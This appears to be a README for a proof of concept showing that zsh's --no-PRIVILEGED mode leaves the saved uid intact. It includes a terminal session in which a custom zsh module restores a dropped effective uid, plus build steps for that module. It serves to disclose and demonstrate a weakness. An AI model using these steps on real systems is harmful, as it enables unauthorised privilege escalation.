# zsh-privileged-upgrade
Restore privileges dropped by zsh in --no-PRIVILEGED mode

## Concept
In zsh, when the PRIVILEGED option is turned off, zsh will "[cause] the effective user and group IDs to be set to the real user and group IDs." However, zsh doesn't change the saved uid. Therefore, the user can load a module that restores the euid to what is was before zsh dropped privileges.

## Example
```
bash % sudo useradd --no-create-home eric
bash % cp /usr/bin/zsh test-zsh
bash % sudo chown eric:eric test-zsh
bash % sudo chmod +s test-zsh
bash % ls -l test-zsh
-rwsr-sr-x 1 eric eric 865456 Nov 30 15:15 test-zsh
bash % ./test-zsh
zsh % id
uid=1000(sam) gid=1000(sam) euid=1001(eric) egid=1001(eric) groups=1001(eric),3(sys),150(wireshark),967(docker),987(uucp),998(wheel),1000(sam)
zsh % exit
bash % ./test-zsh --no-PRIVILEGED
zsh % id
uid=1000(sam) gid=1000(sam) groups=1000(sam)
zsh % cat /proc/$$/status | grep Uid
Uid:	1000	1000	1001	1000
zsh % ls -l setuid.so
-rwxr-xr-x 1 sam sam 14384 Nov 30 14:48 setuid.so
zsh % MODULE_PATH=. zmodload setuid
module loaded
zsh % setuid 1001
calling setuid with user id 1001
success
zsh % id
uid=1000(sam) gid=1000(sam) euid=1001(eric) groups=1000(sam),3(sys),150(wireshark),967(docker),987(uucp),998(wheel)
```

## Compiling setuid.so
Copy setuid.c and setuid.mdd into zsh-repo/Src/Modules/, then build zsh as normal. `setuid.so` will be built to zsh-repo/Src/Modules/setuid.so.
